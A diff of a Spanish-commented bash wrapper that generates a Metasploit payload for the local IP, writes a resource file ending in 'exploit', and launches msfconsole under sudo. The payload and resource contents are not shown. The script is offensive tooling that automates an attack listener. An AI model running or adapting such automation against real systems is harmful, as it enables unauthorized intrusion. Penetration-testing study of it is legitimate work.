@@ -1,12 +1,10 @@
 #!/bin/bash
 
-# Generamos el payload de Metasploit
-bash ./utilities/payload.sh
-
+source ./utilities/utils.sh
 
 # Función para mostrar el uso del script
 usage() {
-    echo "Uso: $0 [-ip <IP_ADDRESS>] [-port <PORT>]"
+    print_cyan "Uso: $0 [-ip <IP_ADDRESS>] [-port <PORT>]"
     exit 1
 }
 
@@ -25,15 +23,21 @@ while [[ "$#" -gt 0 ]]; do
     shift
 done
 
-# Si no se proporcionó una IP, intentar obtener la IP local
+# Verificar si se proporcionó una IP local
 if [[ -z "$LOCAL_IP" ]]; then
-    LOCAL_IP=$(hostname -I | awk '{print $1}')
-fi
-
-# Verificar si la IP es válida
-if [[ -z "$LOCAL_IP" ]]; then
-    echo -e "\e[31mNo se pudo obtener la IP local y no se proporcionó una IP válida.\e[0m"
-    usage
+    # Intentar obtener la IP local automáticamente
+    LOCAL_IP=$(hostname -I 2>/dev/null | awk '{print $1}')
+    if [[ -z "$LOCAL_IP" ]]; then
+        echo -e "\e[31mError: No se pudo obtener la IP local automáticamente. Proporciónala con -i <IP_ADDRESS>\e[0m"
+        exit 1
+    else
+        echo "Usando la IP detectada automáticamente: $LOCAL_IP"
+        bash ./utilities/payload.sh -ip $LOCAL_IP
+    fi
+else
+    # La IP se proporcionó por argumento
+    echo "Usando la IP proporcionada: $LOCAL_IP"
+    bash ./utilities/payload.sh -ip $LOCAL_IP
 fi
 
 # Si no se proporcionó un puerto, usar un valor predeterminado
@@ -45,7 +49,7 @@ fi
 
 # Verificamos si el puerto es válido
 if [[ ! "$PORT" =~ ^[0-9]+$ ]]; then
-    echo -e "\e[31mEl puerto no es válido.\e[0m"
+    print_red -e "\e[31mEl puerto no es válido.\e[0m"
     usage
 fi
 
@@ -59,8 +63,8 @@ exploit
 EOL
 
 # Cambiar los permisos del archivo config.rc
-sudo chown root:root config.rc
-sudo chmod 777 config.rc
+sudo chown root:root config.rc 2>/dev/null
+sudo chmod 777 config.rc 2>/dev/null
 
 # Ejecutar Metasploit con el archivo config.rc
 sudo msfconsole -r config.rc
